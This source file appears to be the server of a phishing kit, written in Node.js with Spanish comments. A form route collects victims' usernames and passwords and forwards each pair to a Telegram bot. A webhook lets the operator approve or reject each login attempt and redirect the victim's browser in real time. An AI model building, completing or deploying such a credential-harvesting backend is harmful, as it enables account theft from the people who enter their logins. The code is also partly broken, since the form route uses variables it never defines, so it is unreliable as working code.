import dotenv from 'dotenv';
import express from 'express';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { createServer } from 'http';
import { Server } from 'socket.io';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const server = createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

let currentSocket = null;

io.on('connection', (socket) => {
  console.log('🟢 Cliente conectado');
  currentSocket = socket;

  socket.on('disconnect', () => {
    console.log('🔴 Cliente desconectado');
    currentSocket = null;
  });
});

// Ruta POST que recibe email y password desde el formulario
app.post('/enviar', async (req, res) => {
  const { usuario, contrasena } = req.body;

  const mensaje = `🔐 Nuevo intento de acceso:\n📧 Correo: ${usuario}\n🔑 Contraseña: ${contrasena}`;

 // Esto depende de cómo manejás los botones, pero algo así:
if (data === 'approve') {
  console.log('✅ Acceso aprobado!');
  if (currentSocket) {
    currentSocket.emit('redirect', '/bienvenido.html'); // URL que quieras
  }
}

if (data === 'reject') {
  console.log('❌ Acceso rechazado!');
  if (currentSocket) {
    currentSocket.emit('redirect', '/denegado.html'); // Otra URL
  }
}


  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      ...opciones
    })
  });

  res.sendStatus(200);
});

// Webhook de Telegram para manejar botones
app.post('/webhook', async (req, res) => {
  const { callback_query } = req.body;
  if (!callback_query) return res.sendStatus(200);

  const data = callback_query.data;
  const chat_id = callback_query.from.id;

  let link = '';
  let mensaje = '';

  if (data === 'aceptar') {
    link = 'https://www.mariohernandez.com.co';
    mensaje = '✅ ¡Acceso aprobado!';
  } else if (data === 'rechazar') {
    link = 'https://as.com';
    mensaje = '❌ Acceso denegado.';
  }

  if (currentSocket) {
    currentSocket.emit('decision', { tipo: data, url: link });
    console.log('📡 Emitido al navegador:', data);
  }

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id,
      text: mensaje,
      reply_markup: {
        inline_keyboard: [[{ text: 'Ir ahora', url: link }]]
      }
    })
  });

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callback_query.id
    })
  });

  res.sendStatus(200);
});

server.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
});
